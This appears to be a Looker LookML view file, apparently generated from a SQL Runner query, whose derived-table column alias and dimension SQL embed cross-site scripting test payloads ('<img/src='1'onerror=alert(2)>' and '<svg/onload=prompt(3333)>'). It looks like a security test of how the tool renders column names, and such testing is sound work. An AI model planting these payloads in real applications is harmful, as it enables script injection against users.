view: sql_runner_query {
  derived_table: {
    sql: SELECT 1 AS `AAA<img/src='1'onerror=alert(2)>AAA<svg/onload=prompt(3333)>BBB` from information_schema.tables Limit 1;
      ;;
  }

  measure: count {
    type: count
    drill_fields: [detail*]
  }

  dimension: aaaimgsrc1onerroralert2aaasvgonloadprompt3333bbb {
    type: number
    sql: ${TABLE}.`AAA<img/src='1'onerror=alert(2)>AAA<svg/onload=prompt(3333)>BBB` ;;
  }

  set: detail {
    fields: [aaaimgsrc1onerroralert2aaasvgonloadprompt3333bbb]
  }
}
